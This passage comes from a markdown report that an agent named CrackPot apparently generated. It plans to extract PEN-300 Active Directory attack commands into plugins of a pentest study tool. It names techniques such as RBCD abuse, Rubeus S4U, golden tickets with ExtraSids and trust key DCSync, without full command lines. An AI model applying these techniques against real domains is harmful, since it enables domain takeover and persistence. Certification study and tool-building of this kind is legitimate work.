✅ Basic Rubeus S4U commands → `ad_attacks.py:675`

### 5.2 Novel Commands to Extract (High Value)

❌ `Get-DomainTrust -API / -NET / LDAP` (3 methods)
❌ Manual LDAP/ADSISearcher ACL queries
❌ `New-MachineAccount` (Powermad - RBCD prerequisite)
❌ RBCD security descriptor setup (msDS-AllowedToActOnBehalfOfOtherIdentity)
❌ `Get-DomainUser -Domain <trust>` (Cross-domain enumeration)
❌ Golden ticket with ExtraSids (`/sids` parameter)
❌ Trust key DCSync (`/user:corp1$`)
❌ `.NET DirectorySearcher` manual alternatives

---

## Section 6: Implementation Notes

### 6.1 Plugin Selection Strategy

- **`ad_enumeration.py`**: Forest trusts, cross-domain enumeration, manual LDAP alternatives
- **`ad_attacks.py`**: RBCD exploitation, ExtraSids golden tickets, trust key attacks
- **`ad_persistence.py`**: RBCD configuration (msDS-AllowedToActOnBehalfOfOtherIdentity write)

### 6.2 Metadata Quality Standards

All tasks must include:
- ✅ `flag_explanations` (EVERY flag explained)
- ✅ `success_indicators` (2-3 specific outcomes)
- ✅ `failure_indicators` (2-3 common failures)
- ✅ `next_steps` (2-4 follow-on actions)
- ✅ `alternatives` (2-3 manual/tool-less methods)
- ✅ `notes` (context, links, OSCP tips, detection notes)

### 6.3 OSCP Educational Focus

- **Manual Alternatives Priority**: Every PowerView command gets `.NET` / LDAP alternative
- **Tool-Less Methods**: Emphasize ADSISearcher, DirectoryEntry for exam scenarios
- **Source Tracking**: All commands show how to document findings
- **Time Estimates**: Include where applicable (QUICK_WIN tags for <30s commands)

---

## Section 7: Conclusion & Next Steps

### 7.1 Summary

**Chapter 16 Analysis:**
- 6,261 lines analyzed
- 50+ PowerView commands extracted
- ~15 commands **already documented** in existing plugins
- ~12 **novel/missing commands** identified for extraction

**Duplicate Rate:** ~55% (good - indicates existing coverage is strong)
**Novel Content:** ~45% (forest trusts, RBCD, cross-domain, manual alternatives)

### 7.2 Recommended Action Plan

1. **Update `ad_enumeration.py`** with:
   - Forest trust enumeration (3 methods)
   - Cross-domain enumeration tasks
   - Manual LDAP/ADSISearcher alternatives

2. **Update `ad_attacks.py`** with:
   - Complete RBCD exploitation chain
   - Golden ticket with ExtraSids
   - Trust key DCSync

3. **Update `ad_persistence.py`** with:
   - RBCD configuration (security descriptor setup)

4. **Skip duplication** of:
   - Basic PowerView ACL commands (already covered)
   - Standard delegation enumeration (already covered)

### 7.3 File Metadata

**Report File:** `/crack/track/services/plugin_docs/PEN300_AD_DELEGATION_MINING_REPORT.md`
**Generated:** 2025-10-08
**Agent:** CrackPot v1.0
**Source:** PEN-300 Chapter 16 (6,261 lines)

---

**END OF MINING REPORT**
